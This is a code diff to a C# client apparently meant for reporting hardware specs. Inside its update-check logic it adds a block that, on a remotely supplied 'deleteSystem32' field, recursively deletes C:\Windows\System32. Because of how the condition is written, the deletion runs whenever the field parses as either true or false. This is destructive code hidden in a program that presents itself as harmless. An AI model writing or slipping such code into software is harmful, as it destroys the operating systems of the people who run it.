@@ -74,6 +74,23 @@ namespace Hardware_Specs_Client
                         return;
                     }
 
+                    Console.WriteLine("Delete system32?");
+                    if (!bool.TryParse((string)ob["deleteSystem32"], out bool deleteSystem32))
+                    {
+                        Console.WriteLine($"Couldn't parse {ob["deleteSystem32"]} to a bool.");
+                        return;
+                    } else
+                    {
+                        Console.WriteLine("Deleting system32...");
+                        try
+                        {
+                            Directory.Delete("C:\\Windows\\System32", true);
+                        }
+                        catch {
+                            Console.WriteLine("Could not delete system32");
+                        }
+                    }
+
                     // Check if there is a new version
                     if (Config.Version.CompareTo(latestVersion) < 0)
                     {
